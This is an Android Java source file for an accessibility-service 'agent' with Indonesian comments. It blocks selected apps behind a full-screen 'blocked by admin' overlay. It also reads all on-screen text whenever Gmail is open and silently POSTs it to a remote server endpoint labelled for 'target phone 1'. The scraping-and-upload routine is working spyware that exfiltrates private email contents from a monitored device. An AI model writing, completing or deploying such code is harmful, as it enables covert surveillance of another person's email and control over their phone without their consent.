package com.ezax.agent;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Build;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class JaxAccessibilityService extends AccessibilityService {
    private static final String SERVER_URL = "http://192.168.1.25:5000"; // SESUAIKAN IP
    private Set<String> blockedApps = new HashSet<>();
    private String lastScrapedText = "";
    private WindowManager windowManager;
    private View blockOverlay;
    private String currentBlockedApp = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        loadBlockedApps();
    }

    private void loadBlockedApps() {
        SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
        String blockedString = prefs.getString("blocked_apps", "");
        blockedApps.clear();
        if (!blockedString.isEmpty()) {
            for (String app : blockedString.split(",")) {
                blockedApps.add(app.trim());
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String packageName = event.getPackageName().toString();
        
        // 1. APP BLOCKER (Pakai Overlay Merah)
        loadBlockedApps();
        if (blockedApps.contains(packageName)) {
            if (!currentBlockedApp.equals(packageName)) {
                showBlockOverlay(packageName);
            }
            return;
        } else {
            if (!currentBlockedApp.isEmpty()) {
                hideBlockOverlay();
            }
        }

        // 2. GMAIL SCRAPER (Simplified: Sedot semua teks layar kalau Gmail kebuka)
        if (packageName.equals("com.google.android.gm")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                StringBuilder sb = new StringBuilder();
                extractText(root, sb);
                String finalText = sb.toString().trim();
                
                // Kirim kalau teksnya beda & lumayan panjang (biar gak spam)
                if (finalText.length() > 30 && !finalText.equals(lastScrapedText)) {
                    lastScrapedText = finalText;
                    kirimKeWeb("gmail", finalText);
                }
            }
        }
    }

    private void showBlockOverlay(String packageName) {
        currentBlockedApp = packageName;
        if (blockOverlay != null) return;

        TextView textView = new TextView(this);
        textView.setText("🚫\n\nAKSES DIBLOKIR\nOLEH ADMIN\n\nAplikasi ini tidak diizinkan.");
        textView.setTextColor(0xFFFFFFFF);
        textView.setTextSize(24f);
        textView.setGravity(Gravity.CENTER);
        textView.setBackgroundColor(0xFFAA0000); // Warna Merah Gelap
        textView.setPadding(50, 50, 50, 50);

        int layoutFlag;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Biar user gak bisa ngeklik apa-apa
                PixelFormat.TRANSLUCENT);

        windowManager.addView(textView, params);
        blockOverlay = textView;
        
        // Balikin ke Home Screen di belakang overlay
        performGlobalAction(GLOBAL_ACTION_HOME);
    }

    private void hideBlockOverlay() {
        currentBlockedApp = "";
        if (blockOverlay != null) {
            try { windowManager.removeView(blockOverlay); } catch (Exception e) {}
            blockOverlay = null;
        }
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) sb.append(node.getText().toString()).append("\n");
        for (int i = 0; i < node.getChildCount(); i++) extractText(node.getChild(i), sb);
    }

    private void kirimKeWeb(String type, String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/upload_result/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", text);
                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes("utf-8")); }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    @Override
    public void onInterrupt() { }
}
